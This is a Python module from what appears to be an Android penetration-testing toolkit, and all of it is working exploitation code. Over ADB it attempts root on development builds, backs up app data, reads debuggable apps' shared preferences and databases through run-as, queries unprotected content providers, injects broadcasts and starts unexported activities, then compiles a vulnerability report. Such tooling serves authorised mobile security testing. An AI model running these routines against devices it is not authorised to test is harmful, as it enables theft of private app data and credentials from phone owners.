"""
ADB-Based Exploitation Techniques

Exploits that leverage ADB access for privilege escalation and data extraction.
Does not require kernel vulnerabilities - uses ADB features and app misconfigurations.
"""

import logging
import os
from dataclasses import dataclass
from enum import Enum
from typing import Optional

from ...reconnaissance import ADBConnection

logger = logging.getLogger(__name__)


class ADBExploitType(Enum):
    ADB_BACKUP = "adb_backup"                    # Extract app data via backup
    DEBUGGABLE_APP = "debuggable_app"            # Exploit debuggable applications
    RUN_AS_ABUSE = "run_as"                      # Abuse run-as for app context
    CONTENT_PROVIDER = "content_provider"        # Query exposed content providers
    BROADCAST_INJECTION = "broadcast_injection"  # Send malicious broadcasts
    ACTIVITY_HIJACK = "activity_hijack"          # Start unexported activities
    ADB_ROOT = "adb_root"                        # ADB root on eng/userdebug builds


@dataclass
class ADBExploitResult:
    """Result of an ADB exploitation attempt."""
    success: bool
    exploit_type: ADBExploitType
    data_extracted: Optional[str]
    output: str
    error: Optional[str] = None


class ADBExploiter:
    """
    ADB-based exploitation techniques.

    These techniques leverage ADB access to:
    - Extract application data
    - Exploit debuggable applications
    - Query exposed content providers
    - Inject broadcasts and start activities
    - Achieve root on development builds
    """

    def __init__(self, adb: ADBConnection):
        self.adb = adb
        self.backup_dir = "output/artifacts"

    def check_adb_root(self) -> bool:
        """Check if ADB root is available (userdebug/eng builds)."""
        # Try adb root
        stdout, stderr, code = self.adb.execute("root")

        if "adbd is already running as root" in stdout:
            return True
        if "restarting adbd as root" in stdout:
            # Wait for reconnection
            import time
            time.sleep(2)
            # Verify
            id_output = self.adb.shell("id")
            return "uid=0" in id_output

        return False

    def exploit_adb_root(self) -> ADBExploitResult:
        """
        Attempt to get root via ADB on development builds.

        Works on:
        - userdebug builds
        - eng (engineering) builds
        """
        logger.info("Attempting ADB root...")

        # Check build type
        build_type = self.adb.get_prop("ro.build.type")
        debuggable = self.adb.get_prop("ro.debuggable")

        if build_type not in ["userdebug", "eng"] and debuggable != "1":
            return ADBExploitResult(
                success=False,
                exploit_type=ADBExploitType.ADB_ROOT,
                data_extracted=None,
                output=f"Build type: {build_type}, debuggable: {debuggable}",
                error="Device is not a development build",
            )

        if self.check_adb_root():
            return ADBExploitResult(
                success=True,
                exploit_type=ADBExploitType.ADB_ROOT,
                data_extracted=None,
                output="ADB root access achieved",
            )

        return ADBExploitResult(
            success=False,
            exploit_type=ADBExploitType.ADB_ROOT,
            data_extracted=None,
            output="",
            error="ADB root failed",
        )

    def exploit_adb_backup(
        self,
        package_name: str,
        output_path: Optional[str] = None,
    ) -> ADBExploitResult:
        """
        Extract application data via ADB backup.

        Works on apps with android:allowBackup="true" (default).
        """
        logger.info(f"Attempting ADB backup of {package_name}...")

        # Check if backup is allowed
        dumpsys = self.adb.shell(f"dumpsys package {package_name} | grep allowBackup")
        if "allowBackup=false" in dumpsys:
            return ADBExploitResult(
                success=False,
                exploit_type=ADBExploitType.ADB_BACKUP,
                data_extracted=None,
                output=dumpsys,
                error=f"App {package_name} does not allow backup",
            )

        # Create output directory
        os.makedirs(self.backup_dir, exist_ok=True)
        if output_path is None:
            output_path = os.path.join(self.backup_dir, f"{package_name}.ab")

        # Perform backup (requires user confirmation on device)
        logger.info("Initiating backup - user must confirm on device...")
        stdout, stderr, code = self.adb.execute(
            f"backup -f {output_path} -noapk {package_name}",
            timeout=60,
        )

        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
            return ADBExploitResult(
                success=True,
                exploit_type=ADBExploitType.ADB_BACKUP,
                data_extracted=output_path,
                output=f"Backup saved to {output_path}",
            )

        return ADBExploitResult(
            success=False,
            exploit_type=ADBExploitType.ADB_BACKUP,
            data_extracted=None,
            output=stdout + stderr,
            error="Backup failed or was declined",
        )

    def exploit_debuggable_app(self, package_name: str) -> ADBExploitResult:
        """
        Exploit a debuggable application to access its sandbox.

        Debuggable apps (android:debuggable="true") allow:
        - Attaching debugger
        - Accessing app files via run-as
        - Memory inspection
        """
        logger.info(f"Checking if {package_name} is debuggable...")

        # Check debuggable status
        test = self.adb.shell(f"run-as {package_name} id 2>&1")

        if "is not debuggable" in test or "Unknown package" in test:
            return ADBExploitResult(
                success=False,
                exploit_type=ADBExploitType.DEBUGGABLE_APP,
                data_extracted=None,
                output=test,
                error=f"App {package_name} is not debuggable",
            )

        # App is debuggable - enumerate files
        logger.info(f"App {package_name} is debuggable, extracting data...")

        files = self.adb.shell(f"run-as {package_name} find . -type f 2>/dev/null | head -50")

        # Try to read sensitive files
        sensitive_files = []
        for pattern in ["shared_prefs/*.xml", "databases/*.db", "files/*"]:
            content = self.adb.shell(f"run-as {package_name} cat {pattern} 2>/dev/null | head -100")
            if content and "No such file" not in content:
                sensitive_files.append(f"=== {pattern} ===\n{content}")

        extracted_data = "\n\n".join(sensitive_files) if sensitive_files else files

        return ADBExploitResult(
            success=True,
            exploit_type=ADBExploitType.DEBUGGABLE_APP,
            data_extracted=extracted_data,
            output=f"Extracted data from {package_name}",
        )

    def exploit_content_provider(
        self,
        authority: str,
        path: str = "",
    ) -> ADBExploitResult:
        """
        Query an exposed content provider.

        Content providers without proper permissions can leak sensitive data.
        """
        logger.info(f"Querying content provider: {authority}")

        uri = f"content://{authority}/{path}"
        output = self.adb.shell(f"content query --uri {uri}")

        if "Permission Denial" in output or "SecurityException" in output:
            return ADBExploitResult(
                success=False,
                exploit_type=ADBExploitType.CONTENT_PROVIDER,
                data_extracted=None,
                output=output,
                error="Content provider is protected",
            )

        if output.strip():
            return ADBExploitResult(
                success=True,
                exploit_type=ADBExploitType.CONTENT_PROVIDER,
                data_extracted=output,
                output=f"Data retrieved from {uri}",
            )

        return ADBExploitResult(
            success=False,
            exploit_type=ADBExploitType.CONTENT_PROVIDER,
            data_extracted=None,
            output="No data returned",
            error="Content provider returned empty result",
        )

    def exploit_broadcast_injection(
        self,
        action: str,
        component: Optional[str] = None,
        extras: Optional[dict] = None,
    ) -> ADBExploitResult:
        """
        Send a broadcast to potentially vulnerable receivers.

        Can trigger unintended behavior in apps with exposed receivers.
        """
        logger.info(f"Sending broadcast: {action}")

        cmd = f"am broadcast -a {action}"
        if component:
            cmd += f" -n {component}"
        if extras:
            for key, value in extras.items():
                if isinstance(value, str):
                    cmd += f" --es {key} '{value}'"
                elif isinstance(value, int):
                    cmd += f" --ei {key} {value}"
                elif isinstance(value, bool):
                    cmd += f" --ez {key} {str(value).lower()}"

        output = self.adb.shell(cmd)

        success = "Broadcast completed" in output or "result=0" in output

        return ADBExploitResult(
            success=success,
            exploit_type=ADBExploitType.BROADCAST_INJECTION,
            data_extracted=None,
            output=output,
            error=None if success else "Broadcast may have failed",
        )

    def exploit_activity_hijack(
        self,
        component: str,
        extras: Optional[dict] = None,
    ) -> ADBExploitResult:
        """
        Start an unexported activity.

        Can bypass intended app flow and access restricted functionality.
        """
        logger.info(f"Starting activity: {component}")

        cmd = f"am start -n {component}"
        if extras:
            for key, value in extras.items():
                if isinstance(value, str):
                    cmd += f" --es {key} '{value}'"

        output = self.adb.shell(cmd)

        if "Permission Denial" in output or "SecurityException" in output:
            return ADBExploitResult(
                success=False,
                exploit_type=ADBExploitType.ACTIVITY_HIJACK,
                data_extracted=None,
                output=output,
                error="Activity is not exported or protected",
            )

        success = "Starting:" in output or "Error" not in output

        return ADBExploitResult(
            success=success,
            exploit_type=ADBExploitType.ACTIVITY_HIJACK,
            data_extracted=None,
            output=output,
        )

    def find_debuggable_apps(self) -> list[str]:
        """Find all debuggable applications on the device."""
        logger.info("Searching for debuggable applications...")

        packages = self.adb.shell("pm list packages -3 | cut -d: -f2")
        debuggable = []

        for pkg in packages.split('\n'):
            pkg = pkg.strip()
            if not pkg:
                continue

            test = self.adb.shell(f"run-as {pkg} id 2>&1")
            if "uid=" in test and "is not debuggable" not in test:
                debuggable.append(pkg)

        logger.info(f"Found {len(debuggable)} debuggable apps")
        return debuggable

    def find_exposed_providers(self) -> list[dict]:
        """Find potentially exposed content providers."""
        logger.info("Searching for exposed content providers...")

        output = self.adb.shell("dumpsys package providers | grep -E '(Provider|authority|permission)'")

        providers = []
        current_provider = {}

        for line in output.split('\n'):
            line = line.strip()
            if 'Provider{' in line:
                if current_provider:
                    providers.append(current_provider)
                current_provider = {'component': line}
            elif 'authority=' in line:
                current_provider['authority'] = line.split('=')[1].strip()
            elif 'permission=' in line and 'null' in line.lower():
                current_provider['exposed'] = True

        if current_provider:
            providers.append(current_provider)

        exposed = [p for p in providers if p.get('exposed')]
        logger.info(f"Found {len(exposed)} potentially exposed providers")

        return exposed

    def extract_all_backup_data(self) -> list[ADBExploitResult]:
        """Attempt to backup all apps that allow it."""
        results = []

        packages = self.adb.shell("pm list packages -3 | cut -d: -f2")

        for pkg in packages.split('\n')[:20]:  # Limit to 20 apps
            pkg = pkg.strip()
            if not pkg:
                continue

            result = self.exploit_adb_backup(pkg)
            if result.success:
                results.append(result)

        return results

    def generate_report(self) -> str:
        """Generate ADB exploitation report."""
        lines = [
            "=" * 60,
            "ADB EXPLOITATION ASSESSMENT",
            "=" * 60,
            "",
        ]

        # ADB Root check
        if self.check_adb_root():
            lines.append("[+] ADB ROOT AVAILABLE")
        else:
            lines.append("[-] ADB root not available")

        lines.append("")

        # Debuggable apps
        lines.append("DEBUGGABLE APPLICATIONS")
        lines.append("-" * 60)
        debuggable = self.find_debuggable_apps()
        if debuggable:
            for app in debuggable[:10]:
                lines.append(f"  [VULN] {app}")
        else:
            lines.append("  None found")

        lines.append("")

        # Exposed providers
        lines.append("EXPOSED CONTENT PROVIDERS")
        lines.append("-" * 60)
        providers = self.find_exposed_providers()
        if providers:
            for p in providers[:10]:
                lines.append(f"  [VULN] {p.get('authority', 'unknown')}")
        else:
            lines.append("  None found")

        lines.append("")
        lines.append("=" * 60)

        return "\n".join(lines)
